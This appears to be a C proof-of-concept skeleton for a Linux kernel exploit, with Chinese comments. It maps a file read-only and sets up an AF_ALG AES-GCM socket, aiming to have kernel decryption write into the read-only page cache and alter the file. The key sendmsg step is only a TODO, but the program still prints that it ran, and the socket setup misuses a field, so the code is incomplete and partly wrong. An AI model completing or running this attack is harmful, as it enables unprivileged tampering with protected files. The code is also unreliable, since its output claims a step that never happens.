#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/if_alg.h>
#include <sys/socket.h>

#define TARGET_FILE "./target.txt"
#define PAGE_SIZE   4096

int main() {
    /* 步驟一：建立並填充目標檔案 */
    int fd = open(TARGET_FILE, O_RDWR | O_CREAT | O_TRUNC, 0644);
    char original[PAGE_SIZE];
    memset(original, 'A', PAGE_SIZE);
    write(fd, original, PAGE_SIZE);
    close(fd);
    printf("[*] 目標檔案已寫入 'A' * 4096\n");

    /* 步驟二：以唯讀方式 mmap 目標檔案（分頁快取支撐）*/
    fd = open(TARGET_FILE, O_RDONLY);
    void *map = mmap(NULL, PAGE_SIZE, PROT_READ,
                     MAP_SHARED, fd, 0);

    /* 步驟三：設定 AF_ALG aead 通訊端（AES-GCM）*/
    int algfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type   = "aead",
        .salg_name   = "gcm(aes)",
        .salg_feat   = 16,   /* 認證標籤長度 */
    };
    bind(algfd, (struct sockaddr *)&sa, sizeof(sa));
    char key[16] = {0};  /* 示範用全零金鑰 */
    setsockopt(algfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));
    int opfd = accept(algfd, NULL, 0);

    /* 步驟四：sendmsg — 輸出 SGL 指向 mmap 後的區域 */
    /* TODO：構造含 ALG_OP_DECRYPT 的 cmsg，            */
    /*       輸入 iov 含精心設計的密文，                  */
    /*       輸出指向 (char*)map                        */

    printf("[*] sendmsg 已觸發——請檢查 target.txt\n");
    /* 步驟五：驗證汙染 */
    fd = open(TARGET_FILE, O_RDONLY);
    char buf[8];
    read(fd, buf, 8);
    printf("[*] 修改後前 8 個位元組：%02x %02x %02x %02x ...\n",
           (unsigned char)buf[0], (unsigned char)buf[1],
           (unsigned char)buf[2], (unsigned char)buf[3]);
    return 0;
}
